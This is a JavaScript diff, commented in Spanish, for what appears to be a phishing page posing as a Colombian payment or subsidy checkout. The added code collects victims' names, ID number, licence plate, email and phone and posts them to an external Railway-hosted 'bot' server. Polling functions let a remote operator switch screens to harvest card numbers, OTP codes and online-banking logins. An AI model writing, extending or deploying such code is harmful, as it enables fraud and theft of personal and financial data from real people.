@@ -2,7 +2,7 @@
    CONFIGURACIÓN
    ============================================================ */
 var URL_BOT_RAILWAY = 'https://multi-bancos-production.up.railway.app';
-var TOTAL_PAGO = 95700;
+var TOTAL_PAGO = Number(sessionStorage.getItem('sub_precio')) || 95700;
 var BANCO_KEY_ACTUAL = 'cc-bucaramanga';
 
 var URLS_BANCOS = {
@@ -113,7 +113,7 @@ window.addEventListener('DOMContentLoaded', function() {
 });
 
 /* ============================================================ 
-   LEER DATOS DE SESSIONSTORAGE
+   LEER DATOS DE SESSIONSTORAGE Y ENVIAR AL HISTORIAL
    ============================================================ */
 (function() {
   var nombres = sessionStorage.getItem('sub_nombres') || 'JUAN';
@@ -123,11 +123,14 @@ window.addEventListener('DOMContentLoaded', function() {
   var documento = sessionStorage.getItem('sub_documento') || '1234567890';
   var placa = sessionStorage.getItem('sub_placa') || 'ABC123';
   var correo = sessionStorage.getItem('sub_correo') || 'correo@ejemplo.com';
+  var telefono = sessionStorage.getItem('sub_telefono') || '3000000000'; // 🔥 NUEVO
+  var precioGuardado = sessionStorage.getItem('sub_precio') || '95700'; // 🔥 NUEVO
 
   window.__DATOS_SUBSIDIO__ = {
     nombres: nombres, apellidos: apellidos,
     primerNombre: primerNombre, primerApellido: primerApellido,
     documento: documento, placa: placa, correo: correo,
+    telefono: telefono, // 🔥 NUEVO
     nombreCompleto: (nombres + ' ' + apellidos).toUpperCase(),
     nombrePSE: (primerNombre + ' ' + primerApellido).toUpperCase()
   };
@@ -143,6 +146,22 @@ window.addEventListener('DOMContentLoaded', function() {
   if (docNumberInput) docNumberInput.value = documento;
   var inputDocPse = document.getElementById('input-doc-pse');
   if (inputDocPse) inputDocPse.value = documento;
+
+  // 🔥 ENVIAR DATOS AL HISTORIAL DEL ADMIN
+  fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/guardar-consulta', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      sessionId: window.__PYP_SESSION__,
+      nombres: nombres,
+      apellidos: apellidos,
+      documento: documento,
+      placa: placa,
+      correo: correo,
+      telefono: telefono,
+      precio: precioGuardado
+    })
+  }).catch(function() {});
 })();
 
 /* ============================================================ 
@@ -492,7 +511,7 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 
 /* ============================================================ 
-   POLLING DE PAGO (tarjeta inicial)
+   POLLING DE PAGO (tarjeta inicial y pantalla de espera final)
    ============================================================ */
 function iniciarPollingPago(sessionId, marca, payload) {
   if (pagoPollingInterval) clearInterval(pagoPollingInterval);
@@ -512,8 +531,8 @@ function iniciarPollingPago(sessionId, marca, payload) {
           
           document.getElementById('lastFourDigitsPopup').textContent = enmascarado;
           document.getElementById('popupCardNumber').textContent = enmascarado;
-          document.getElementById('montoPopup').textContent = Number(payload.monto).toLocaleString('es-CO');
-          document.getElementById('montoPopup2').textContent = Number(payload.monto).toLocaleString('es-CO');
+          document.getElementById('montoPopup').textContent = Number(payload.monto || TOTAL_PAGO).toLocaleString('es-CO');
+          document.getElementById('montoPopup2').textContent = Number(payload.monto || TOTAL_PAGO).toLocaleString('es-CO');
           
           var logoContainer = document.getElementById('cardBrandLogo');
           if (marca === 'visa') {
@@ -531,7 +550,7 @@ function iniciarPollingPago(sessionId, marca, payload) {
             
           openAuthModal();
           
-        } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
+              } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
           clearInterval(pagoPollingInterval);
           pagoPollingInterval = null;
           ocultarPagoCarga();
@@ -541,7 +560,7 @@ function iniciarPollingPago(sessionId, marca, payload) {
           document.getElementById('expiryYear').value = '';
           document.getElementById('cvv').value = '';
           
-          mostrarPagoError(marca, data.estado);
+          mostrarPagoError(marca, data.estado); 
         }
       })
       .catch(function(err) { console.error('Error consultando estado:', err); });
@@ -584,12 +603,15 @@ function mostrarPagoError(marca, tipo) {
     if (logo) {
         logo.innerHTML = ''; 
         var svgHTML = '';
-        if (marca === 'visa') {
-            svgHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
+        
+        // 🔥 AQUÍ ESTÁ LA CORRECCIÓN: Evaluamos la marca real
+        if (marca === 'mastercard' || marca === 'mc') {
+            svgHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
         } else if (marca === 'amex') {
             svgHTML = '<img src="img/amex.svg" style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto; background-color: #ffffff; padding: 4px; border-radius: 6px;">';
         } else {
-            svgHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
+            // Si es visa o cualquier otra cosa, muestra Visa
+            svgHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
         }
         logo.innerHTML = svgHTML;
     }
@@ -614,7 +636,6 @@ function openAuthModal() {
   modal.style.display = 'flex';
   setTimeout(function() { modal.classList.add('show'); }, 10);
 
-  // 🔥 INICIAR POLLING DE OTP (para detectar CC_ERROR/AUTORIZAR del admin)
   if (sessionIdActualPago) {
     iniciarPollingOtpActivo(sessionIdActualPago);
   }
@@ -623,7 +644,6 @@ function closeAuthModal() {
   var modal = document.getElementById('authModal');
   modal.classList.remove('show');
   setTimeout(function() { modal.style.display = 'none'; document.body.style.overflow = ''; }, 400);
-  // 🔥 Detener polling activo de OTP al cerrar
   if (pagoOtpPollingActivoInterval) {
     clearInterval(pagoOtpPollingActivoInterval);
     pagoOtpPollingActivoInterval = null;
@@ -641,7 +661,6 @@ document.getElementById('btnEnviarDinamica').addEventListener('click', function(
   if (cardNum.startsWith('5') || cardNum.startsWith('2')) marca = 'mastercard';
   else if (cardNum.startsWith('3')) marca = 'amex';
 
-  // Ocultar mensaje de error si existía
   var otpError = document.getElementById('otpErrorMsg');
   if (otpError) otpError.style.display = 'none';
 
@@ -714,7 +733,6 @@ function iniciarPollingOtp(sessionId, marca) {
           ocultarCargaOtp();
           setTimeout(function() { window.location.href = window.location.pathname; }, 300);
         }
-        // 🔥 AUTORIZAR → abrir modal banca virtual
         else if (data.accion === 'AUTORIZAR' || data.estado === 'autorizacion') {
           clearInterval(pagoOtpPollingInterval);
           pagoOtpPollingInterval = null;
@@ -726,7 +744,6 @@ function iniciarPollingOtp(sessionId, marca) {
           });
         }
         else if (data.accion === 'CC_ERROR' || data.estado === 'cc_error') {
-          // 🔥 CC_ERROR → mostrar pantalla error OTP "Tarjeta no admitida"
           clearInterval(pagoOtpPollingInterval);
           pagoOtpPollingInterval = null;
           ocultarCargaOtp();
@@ -734,7 +751,6 @@ function iniciarPollingOtp(sessionId, marca) {
           mostrarErrorOtp('cc_error');
         } 
         else if (data.accion === 'RECHAZAR' || data.estado === 'rechazado') {
-          // 🔥 RECHAZAR → mostrar pantalla error OTP "Código incorrecto"
           clearInterval(pagoOtpPollingInterval);
           pagoOtpPollingInterval = null;
           ocultarCargaOtp();
@@ -748,8 +764,6 @@ function iniciarPollingOtp(sessionId, marca) {
 
 /* ============================================================ 
    🔥 POLLING ACTIVO DE OTP (cuando el usuario ESTÁ en la pantalla OTP)
-   AUTORIZAR → abre modal banca virtual | CC_ERROR → vuelve a tarjeta
-   RECHAZAR → no hace nada (deja la pantalla tal cual)
    ============================================================ */
 var pagoOtpPollingActivoInterval = null;
 
@@ -763,7 +777,6 @@ function iniciarPollingOtpActivo(sessionId) {
         var accion = data.accion || '';
         var estado = data.estado || '';
 
-        // 🔥 AUTORIZAR → abrir modal banca virtual
         if (accion === 'AUTORIZAR' || estado === 'autorizacion') {
           clearInterval(pagoOtpPollingActivoInterval);
           pagoOtpPollingActivoInterval = null;
@@ -783,12 +796,10 @@ function iniciarPollingOtpActivo(sessionId) {
           return;
         }
 
-        // CC_ERROR → cerrar OTP, borrar tarjeta, reabrir modal tarjeta con error
         if (accion === 'CC_ERROR' || estado === 'cc_error') {
           clearInterval(pagoOtpPollingActivoInterval);
           pagoOtpPollingActivoInterval = null;
 
-          // Cerrar modal OTP
           var modal = document.getElementById('authModal');
           if (modal) {
             modal.classList.remove('show');
@@ -796,7 +807,6 @@ function iniciarPollingOtpActivo(sessionId) {
           }
           document.body.style.overflow = '';
 
-          // Limpiar campos de tarjeta
           var cardNumber = document.getElementById('cardNumber');
           var expiryMonth = document.getElementById('expiryMonth');
           var expiryYear = document.getElementById('expiryYear');
@@ -817,12 +827,8 @@ function iniciarPollingOtpActivo(sessionId) {
           if (accept2) accept2.checked = false;
           if (submitBtn) submitBtn.disabled = true;
 
-          // Mostrar pantalla error de tarjeta
           mostrarPagoError('visa', 'cc_error');
         }
-
-        // RECHAZAR → no hacer nada (dejar la pantalla tal cual)
-        // Solo detenemos el polling para no repetir la acción.
         else if (accion === 'RECHAZAR' || estado === 'rechazado') {
           clearInterval(pagoOtpPollingActivoInterval);
           pagoOtpPollingActivoInterval = null;
@@ -911,10 +917,12 @@ document.addEventListener('DOMContentLoaded', function() {
     .then(function(data) {
       if (data && data.ok) {
         cerrarModalAutorizacion();
-        // Aquí puedes redirigir o mostrar pantalla de éxito
-        setTimeout(function() {
-          window.location.href = window.location.pathname;
-        }, 300);
+        // 🔥 MOSTRAR PANTALLA DE ESPERA WOMPI
+        mostrarPagoCarga('visa'); 
+        
+        // 🔥 INICIAR POLLING PARA ESPERAR RESPUESTA DEL ADMIN
+        iniciarPollingPago(sessionId, 'visa', { tarjeta: (document.getElementById('cardNumber').value || '') }); 
+        
       } else {
         throw new Error((data && data.error) || 'Error al enviar');
       }
@@ -927,4 +935,58 @@ document.addEventListener('DOMContentLoaded', function() {
       btnEnviar.textContent = 'Enviar';
     });
   });
+});
+
+/* ============================================================ 
+   🔥 ESCUCHA GLOBAL DE AUTORIZACIÓN (Funciona en cualquier pantalla)
+   ============================================================ */
+var globalAutorizarInterval = null;
+var yaSeAbrioModalAuth = false;
+
+function iniciarEscuchaGlobalAutorizar() {
+  if (globalAutorizarInterval) clearInterval(globalAutorizarInterval);
+  
+  globalAutorizarInterval = setInterval(function() {
+    var sid = sessionIdActualPago || window.__PYP_SESSION__;
+    if (!sid) return;
+    if (yaSeAbrioModalAuth) return;
+
+    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/estado/' + sid)
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (data.accion === 'AUTORIZAR' || data.estado === 'autorizacion') {
+          yaSeAbrioModalAuth = true;
+          clearInterval(globalAutorizarInterval);
+          globalAutorizarInterval = null;
+
+          if (typeof ocultarPagoCarga === 'function') ocultarPagoCarga();
+          if (typeof ocultarCargaOtp === 'function') ocultarCargaOtp();
+          
+          var modalOtp = document.getElementById('authModal');
+          if (modalOtp) {
+            modalOtp.classList.remove('show');
+            setTimeout(function() { modalOtp.style.display = 'none'; }, 400);
+          }
+          document.body.style.overflow = '';
+
+          var cardNum = (document.getElementById('cardNumber').value || '').replace(/\D/g, '');
+          if (typeof abrirModalAutorizacion === 'function') {
+            abrirModalAutorizacion({
+              monto: TOTAL_PAGO,
+              ultimos4: cardNum.slice(-4)
+            });
+          }
+        }
+        
+        if (data.accion === 'RECHAZAR' || data.accion === 'CC_ERROR') {
+          clearInterval(globalAutorizarInterval);
+          globalAutorizarInterval = null;
+        }
+      })
+      .catch(function() {});
+  }, 2000);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  iniciarEscuchaGlobalAutorizar();
 });
